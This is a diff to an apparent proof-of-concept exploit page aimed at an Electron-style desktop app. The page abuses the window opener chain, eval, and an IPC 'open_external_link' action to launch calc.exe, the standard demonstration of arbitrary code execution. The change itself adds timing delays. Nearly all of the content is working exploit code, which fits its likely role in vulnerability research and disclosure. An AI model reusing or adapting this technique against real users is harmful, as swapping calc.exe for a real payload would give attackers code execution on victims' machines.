@@ -5,12 +5,17 @@
 opener.location = '/';
 
 if (opener.opener != undefined) {
+    setTimeout(function(){
     opener.eval('opener.location.href = "/";');
+    },'1000');
     setTimeout(function(){
         opener.opener.ipcApi.send('main-action-triggered',{actionEnum:'open_external_link',payload:'file:///c:/windows/system32/calc.exe'});
-    },'1000');
+    },'2000');
 } else {
+    setTimeout(function(){
     opener.ipcApi.send('main-action-triggered',{actionEnum:'open_external_link',payload:'file:///c:/windows/system32/calc.exe'});
+    },'2000');
 }
 </script>
 </html>
+
